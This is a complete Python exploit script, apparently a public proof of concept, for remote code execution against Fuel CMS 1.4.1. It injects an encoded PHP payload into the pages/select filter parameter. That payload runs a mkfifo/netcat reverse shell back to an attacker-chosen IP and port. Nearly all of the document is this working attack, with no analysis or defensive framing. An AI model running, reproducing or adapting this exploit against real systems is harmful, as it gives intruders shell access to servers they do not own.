#!/usr/bin/python3
import requests
import urllib.parse
import sys
import socket
import time

print("Fuel CMS 1.4.1 Exploit by Covert-Ops")


# Check for proper arguments
if len(sys.argv) != 4:
    print("Usage: python3 exploit.py <target-url> <attacker-ip> <attacker-port>")
    sys.exit(1)

# Command-line arguments
url = sys.argv[1]
ip = sys.argv[2]
port = sys.argv[3]

# Validate IP address and port
def validate_ip(ip):
    try:
        socket.inet_aton(ip)  # This will raise an exception if IP is invalid
        return True
    except socket.error:
        return False

def validate_port(port):
    return port.isdigit() and 1 <= int(port) <= 65535

if not validate_ip(ip):
    print(f"Invalid IP address: {ip}")
    sys.exit(1)

if not validate_port(port):
    print(f"Invalid port: {port}")
    sys.exit(1)

# Reverse shell command to be injected
command = f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc {ip} {port} > /tmp/f"

# URL-encode the reverse shell command
encoded_command = urllib.parse.quote(command)

# Crafting the payload
payload = f"{url}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{encoded_command}%27%29%2b%27"

# Send the HTTP GET request with the crafted payload
try:
    print(f"Sending payload to {url}...")
    r = requests.get(payload)

    if r.status_code == 200:
        print(f"Exploit sent successfully! Reverse shell should now be connecting to {ip}:{port}.")
    else:
        print(f"Failed to exploit the target. Server responded with status code {r.status_code}.")
except requests.exceptions.RequestException as e:
    print(f"Error occurred: {e}")
    sys.exit(1)

# Giving time for the reverse shell to connect
time.sleep(2)
